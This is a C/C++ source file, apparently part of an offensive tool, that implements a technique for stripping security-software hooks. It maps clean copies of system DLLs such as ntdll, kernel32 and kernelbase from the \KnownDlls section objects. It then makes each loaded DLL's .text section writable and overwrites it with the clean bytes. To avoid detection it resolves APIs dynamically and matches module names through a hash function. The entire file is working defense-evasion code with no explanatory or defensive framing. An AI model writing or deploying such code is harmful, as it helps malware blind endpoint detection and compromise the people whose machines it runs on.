#include "camouflage.h"


static void Map_Dll(OUT PVOID* pBuffer, IN const WCHAR* Knowndll)
{
	
	HANDLE			   hSection = NULL;
	ULONG					result = 1;
	LPVOID			  dllBuffer = NULL;
	UNICODE_STRING		uniStr = { 0 };
	OBJECT_ATTRIBUTES	objAtr = { 0 };

		 
	uniStr.Buffer = (PWSTR)Knowndll;
	uniStr.Length = wcslen(Knowndll) * sizeof(WCHAR);
	uniStr.MaximumLength = uniStr.Length + sizeof(WCHAR);

	InitializeObjectAttributes(&objAtr, &uniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);


	fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtOpenSection");

	
	if (!NT_SUCCESS(result = pNtOpenSection(&hSection, SECTION_MAP_READ, &objAtr)))
	{
		printf("\033[0;31m[!]\033[0mNtOpenSection Failed With Error : 0x%0.8X \n", result);
		return;
	}
	
	fnMapViewOfFile pfnMapViewOfFile = (fnMapViewOfFile)GetProcAddress(GetModuleHandle(L"kernel32"), "MapViewOfFile");
	

	dllBuffer = pfnMapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (!dllBuffer)
	{
		printf_s("\033[0;31m[!]\033[0mFailed To Map File With ERROR : %d\n", GetLastError());
		return;
	}

	*pBuffer = dllBuffer;

	CloseHandle(hSection);
}

static PVOID DLL_Base_Addr(IN const WCHAR* Sys32Dll)
{
	PVOID	 Base = NULL;
	DWORD cbNeeded = 0;
	HMODULE lphModule[1024] = { 0 };
	int i = 0, cModules = 0;
	
	fnK32EnumProcessModules pfnK32EnumProcessModules = (fnK32EnumProcessModules)GetProcAddress(GetModuleHandle(L"kernel32"), "K32EnumProcessModules");
	
	if (pfnK32EnumProcessModules(GetCurrentProcess(), lphModule, sizeof(lphModule), &cbNeeded))
	{
		
		cModules = cbNeeded / sizeof(lphModule[0]);
		far WCHAR module[MAX_PATH] = { 0 };
		
		for (; i < cModules; i++)
		{
			fnGetModuleFileNameW pfnGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddress(GetModuleHandle(L"kernel32"), "GetModuleFileNameW");
			
			pfnGetModuleFileNameW(lphModule[i], module, MAX_PATH);

			if (RSHasher((PWCHAR)Sys32Dll, module))
			{
				return lphModule[i];
			}
		}
	}
	else
	{
		printf("\033[0;31m[!]\033[0mEnumProcess Modules Failed With Error : %d\n", GetLastError());
		return NULL;
	}
	return NULL;
}

static BOOL Read_Text_Section(IN const WCHAR* KnownDll, IN const WCHAR* Sys32Dll, IN const WCHAR* print)
{
	SIZE_T					szText = 0;
	PVOID			   localDll = NULL,
					  remoteDll = NULL,
			   localTextSection = NULL,
			  remoteTextSection = NULL;
	LPCVOID		   remoteHeader = NULL;
	PIMAGE_DOS_HEADER	  p_idh = NULL;
	PIMAGE_NT_HEADERS	  p_inh = NULL;
	PIMAGE_SECTION_HEADER p_ish = NULL;



	localDll = (PVOID)DLL_Base_Addr(Sys32Dll);
	
	if (localDll)
	{
		p_idh = (PIMAGE_DOS_HEADER)localDll;
		if (p_idh->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

		p_inh = (PIMAGE_NT_HEADERS)((LPBYTE)localDll + p_idh->e_lfanew);
		if (p_inh->Signature != IMAGE_NT_SIGNATURE) return FALSE;
	}
	
	
	Map_Dll(&remoteDll, KnownDll);
	if (!remoteDll) return FALSE;
	
	remoteHeader = remoteDll;

	p_ish = IMAGE_FIRST_SECTION(p_inh);

	for (int i = 0; i < p_inh->FileHeader.NumberOfSections; i++)
	{
		if ((*(PULONG)p_ish[i].Name | 0x20202020) == 'xet.')
		{
			localTextSection = C_PTR(((ULONG_PTR)localDll + p_ish[i].VirtualAddress));
			remoteTextSection = C_PTR(((ULONG_PTR)remoteDll + p_ish[i].VirtualAddress));
			szText = p_ish[i].Misc.VirtualSize;
			break;
		}
	}


	if (!localTextSection || !remoteTextSection || szText == 0) return FALSE;

	if (*(PULONG)localTextSection != *(PULONG)remoteTextSection) return FALSE;


	DWORD dwOldProtect = NULL;

	fnVirtualProtect pfnVirtualProtect = (fnVirtualProtect)GetProcAddress(GetModuleHandle(L"kernel32"), "VirtualProtect");
	
	if (!pfnVirtualProtect(localTextSection, szText, PAGE_EXECUTE_WRITECOPY, &dwOldProtect)) {
		printf("\033[0;31m[!]\033[0mVirtualProtect [1] Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	memcpy(localTextSection, remoteTextSection, szText);

	if (!pfnVirtualProtect(localTextSection, szText, dwOldProtect, &dwOldProtect)) {
		printf("\033[0;31m[!]\033[0mVirtualProtect [2] Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	//printf_s("\033[0;32m[+]\033[0mOperation Successfull\n");

	fnUnmapViewOfFile pfnUnmapViewOfFile = (fnUnmapViewOfFile)GetProcAddress(GetModuleHandle(L"kernel32"), "UnmapViewOfFile");
	
	if (!pfnUnmapViewOfFile(remoteHeader))
	{
		printf("\033[0;31m[!]\033[0mUnmapViewOfFile Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}



BOOL UnHook_Dlls(IN int name)
{
	
	const WCHAR* KnwnDLL{};
	const WCHAR* Sys32DLL{};
	const WCHAR* print{};

	switch (name)
	{
		case 1:
			KnwnDLL = L"\\KnownDlls\\ntdll.dll";
			Sys32DLL = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
			print = L"ntdll.dll";
			break;
		case 2:
			KnwnDLL = L"\\KnownDlls\\kernelbase.dll";
			Sys32DLL = L"C:\\Windows\\System32\\KERNELBASE.dll";
			print = L"kernelbase.dll";
			break;
		case 3:
			KnwnDLL = L"\\KnownDlls\\kernel32.dll";
			Sys32DLL = L"C:\\Windows\\System32\\KERNEL32.DLL";
			print = L"kernel32.dll";
			break;
		case 4:
			KnwnDLL = L"\\KnownDlls\\advapi32.dll";
			Sys32DLL = L"C:\\Windows\\System32\\ADVAPI32.dll";
			print = L"advapi32.dll";
			break;
		case 5:
			KnwnDLL = L"\\KnownDlls\\ucrtbase.dll";
			Sys32DLL = L"C:\\Windows\\System32\\ucrtbase.dll";
			print = L"ucrtbase.dll";
			break;
		case 6:
			KnwnDLL = L"\\KnownDlls\\user32.dll";
			Sys32DLL = L"C:\\Windows\\System32\\USER32.dll";
			print = L"user32.dll";
			break;
		case 7:
			KnwnDLL = L"\\KnownDlls\\sechost.dll";
			Sys32DLL = L"C:\\Windows\\System32\\sechost.dll";
			print = L"sechost.dll";
			break;
		case 8:
			KnwnDLL = L"\\KnownDlls\\IMM32.dll";
			Sys32DLL = L"C:\\Windows\\System32\\IMM32.DLL";
			print = L"imm32.dll";
			break;
		case 9:
			KnwnDLL = L"\\KnownDlls\\msvcp_win.dll";
			Sys32DLL = L"C:\\Windows\\System32\\msvcp_win.dll";
			print = L"msvcp_win.dll";
			break;
	}

	//printf_s("\033[0;32m[+]\033[0mUnooking %ws\033[0m\n", print);

	if (Read_Text_Section(KnwnDLL, Sys32DLL, print)) return TRUE;
	
	return FALSE;
}